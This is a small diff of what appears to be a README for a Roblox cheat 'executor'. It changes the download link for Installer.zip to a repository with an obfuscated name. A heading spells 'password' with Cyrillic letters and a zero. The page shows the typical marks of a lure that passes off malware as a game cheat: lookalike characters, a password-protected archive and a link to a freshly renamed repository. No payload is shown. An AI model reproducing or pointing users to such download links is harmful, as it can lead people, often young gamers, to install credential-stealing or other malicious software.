@@ -3,7 +3,7 @@
 
 ### РАSSW0RD - 2024
 
-# DOWNLOAD: [Click Here](https://github.com/epicgibtschelle/Roblox-Executor/releases/download/RBX/Installer.zip)
+# DOWNLOAD: [Click Here](https://github.com/epicgibtschelle/R0blox-Ex3cutor-lnjector-2024/releases/download/RBX/Installer.zip)
 
 
 
